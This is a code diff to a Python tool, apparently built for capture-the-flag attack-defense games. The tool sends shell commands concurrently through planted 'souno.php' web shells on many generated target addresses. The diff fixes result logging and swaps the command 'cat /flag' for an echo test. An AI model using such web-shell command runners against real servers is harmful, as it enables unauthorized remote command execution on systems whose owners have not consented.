@@ -41,10 +41,8 @@ class PHPConnectionTester:
         if response.status_code == 200:
             result = response.text
             rich_print(f"响应: {result}")
-            if result == '':
-                result = '\n\r'
             with open(self.OUTPUT_FILE, 'a', encoding='utf-8') as file:
-                file.write(f"[php][{datetime.now()}] {url} - {result if result == '' else newline}")
+                file.write(f"[php][{datetime.now()}] {url} - {result if result != '' else newline}")
         else:
             rich_print("执行命令失败。")
         rich_print("=======================================")
@@ -112,7 +110,8 @@ class PHPConnectionTester:
                         rich_print(f"{url} 异常: {e}")
             with ThreadPoolExecutor(max_workers=10) as executor:
                 future_to_url = {
-                    executor.submit(self.test_php_connection, url, "souno", "cat /flag", "GET", use_system): url for
+                    executor.submit(self.test_php_connection, url, "souno", "echo \"hello souno\"", "GET",
+                                    use_system): url for
                     url in IPManager().generate_urls(port, f"{self.SHELL_PATH}souno.php")
                 }
                 for future in as_completed(future_to_url):
